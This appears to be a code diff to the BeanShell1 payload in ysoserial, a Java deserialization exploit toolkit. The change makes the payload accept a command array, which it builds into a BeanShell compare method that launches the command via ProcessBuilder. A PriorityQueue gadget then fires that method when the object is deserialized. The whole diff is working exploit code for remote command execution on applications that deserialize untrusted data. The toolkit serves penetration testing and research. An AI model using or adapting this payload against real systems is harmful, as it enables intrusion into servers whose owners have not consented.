@@ -9,6 +9,7 @@ import java.util.Comparator;
 import java.util.PriorityQueue;
 import ysoserial.payloads.util.Reflections;
 import ysoserial.payloads.annotation.Dependencies;
+import ysoserial.payloads.util.Gadgets;
 import ysoserial.payloads.util.PayloadRunner;
 
 /**
@@ -19,9 +20,13 @@ import ysoserial.payloads.util.PayloadRunner;
 @Dependencies({ "org.beanshell:bsh:2.0b5" })
 public class BeanShell1 extends PayloadRunner implements ObjectPayload<PriorityQueue> {
  
-    public PriorityQueue getObject(String command) throws Exception {
+    public PriorityQueue getObject(String[] command) throws Exception {
 	// BeanShell payload
-	String payload = "compare(Object foo, Object bar) {new java.lang.ProcessBuilder(new String[]{\"" + command + "\"}).start();return new Integer(1);}";
+    StringBuffer b = new StringBuffer();
+    b.append("compare(Object foo, Object bar) {new java.lang.ProcessBuilder(new String[]{");
+    Gadgets.createStringArray(command, b);
+    b.append("}).start();return new Integer(1);}");
+	String payload = b.toString();
 
 	// Create Interpreter
 	Interpreter i = new Interpreter();
